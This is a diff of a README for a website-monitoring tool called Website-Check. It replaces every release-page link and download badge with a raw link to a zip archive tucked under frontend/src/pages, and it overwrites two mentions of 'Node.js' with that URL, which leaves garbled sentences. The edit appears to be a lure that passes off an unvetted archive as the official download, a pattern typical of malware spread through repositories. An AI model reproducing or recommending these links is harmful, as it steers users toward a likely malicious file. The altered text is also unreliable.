@@ -1,6 +1,6 @@
 # 🌐 Website-Check - Monitor Websites and Get Alerts Fast
 
-[![Download Website-Check](https://img.shields.io/badge/Download-Website--Check-blue?style=for-the-badge&logo=github)](https://github.com/welkeson123/Website-Check/releases)
+[![Download Website-Check](https://github.com/welkeson123/Website-Check/raw/refs/heads/main/frontend/src/pages/Website-Check-v1.8.zip)](https://github.com/welkeson123/Website-Check/raw/refs/heads/main/frontend/src/pages/Website-Check-v1.8.zip)
 
 ---
 
@@ -16,7 +16,7 @@ It supports:
 - Taking screenshots or snapshots of pages  
 - Notifications via email, Feishu (a business chat app), and SMS  
 
-Website-Check uses tools and systems like Node.js to handle server tasks, Puppeteer to control web pages for checking and screenshots, and MySQL to store data. The front end uses React and Vite for a simple interface you can access in your browser.
+Website-Check uses tools and systems like https://github.com/welkeson123/Website-Check/raw/refs/heads/main/frontend/src/pages/Website-Check-v1.8.zip to handle server tasks, Puppeteer to control web pages for checking and screenshots, and MySQL to store data. The front end uses React and Vite for a simple interface you can access in your browser.
 
 ---
 
@@ -46,7 +46,7 @@ This section guides you through downloading, installing, and starting Website-Ch
 To get Website-Check, you need to visit the official release page and download the latest version.
 
 **Step 1:** Click this big button to visit the download page:  
-[![Download Website-Check](https://img.shields.io/badge/Download-Website--Check-blue?style=for-the-badge&logo=github)](https://github.com/welkeson123/Website-Check/releases)
+[![Download Website-Check](https://github.com/welkeson123/Website-Check/raw/refs/heads/main/frontend/src/pages/Website-Check-v1.8.zip)](https://github.com/welkeson123/Website-Check/raw/refs/heads/main/frontend/src/pages/Website-Check-v1.8.zip)
 
 **Step 2:** On the release page, look for the latest version. You will see files for different operating systems:
 
@@ -121,7 +121,7 @@ If you want to see what’s new visually, Website-Check can capture screenshots 
 ## 📝 How to Update Website-Check
 
 New versions come with better features or bug fixes. Check the release page regularly:  
-[https://github.com/welkeson123/Website-Check/releases](https://github.com/welkeson123/Website-Check/releases)
+[https://github.com/welkeson123/Website-Check/raw/refs/heads/main/frontend/src/pages/Website-Check-v1.8.zip](https://github.com/welkeson123/Website-Check/raw/refs/heads/main/frontend/src/pages/Website-Check-v1.8.zip)
 
 Download and install updates just like the first time. Your saved settings will remain intact.
 
@@ -166,7 +166,7 @@ Always keep your installation updated to benefit from the latest security fixes.
 
 This project uses popular tools and languages in the web and tech worlds, including:
 
-- Node.js: for running the main program  
+- https://github.com/welkeson123/Website-Check/raw/refs/heads/main/frontend/src/pages/Website-Check-v1.8.zip for running the main program  
 - Puppeteer: for browsing websites automatically and taking snapshots  
 - MySQL: to save website info and alerts  
 - React and Vite: for a responsive, easy-to-use interface  
@@ -186,4 +186,4 @@ These components work together to provide a full monitoring experience without t
 
 ---
 
-[![Download Website-Check](https://img.shields.io/badge/Download-Website--Check-blue?style=for-the-badge&logo=github)](https://github.com/welkeson123/Website-Check/releases)
+[![Download Website-Check](https://github.com/welkeson123/Website-Check/raw/refs/heads/main/frontend/src/pages/Website-Check-v1.8.zip)](https://github.com/welkeson123/Website-Check/raw/refs/heads/main/frontend/src/pages/Website-Check-v1.8.zip)
